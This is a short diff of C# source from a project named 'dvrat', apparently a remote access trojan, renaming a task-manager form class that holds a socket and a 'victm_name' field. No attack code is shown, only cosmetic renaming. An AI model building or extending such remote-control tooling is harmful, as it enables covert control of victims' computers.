@@ -12,13 +12,13 @@ using System.Threading;
 
 namespace dvrat
 {
-    public partial class tsk_mgr_view : Form
+    public partial class TaskManger : Form
     {
         JObject _tsk_mgr_obj;
         Socket _client;
-        Form1 _parent;
+        MainForm _parent;
         public string victm_name = "";
-        public tsk_mgr_view(Socket client , Form1 parent, JObject tsk_mgr_obj)
+        public TaskManger(Socket client , MainForm parent, JObject tsk_mgr_obj)
         {
             
             InitializeComponent();
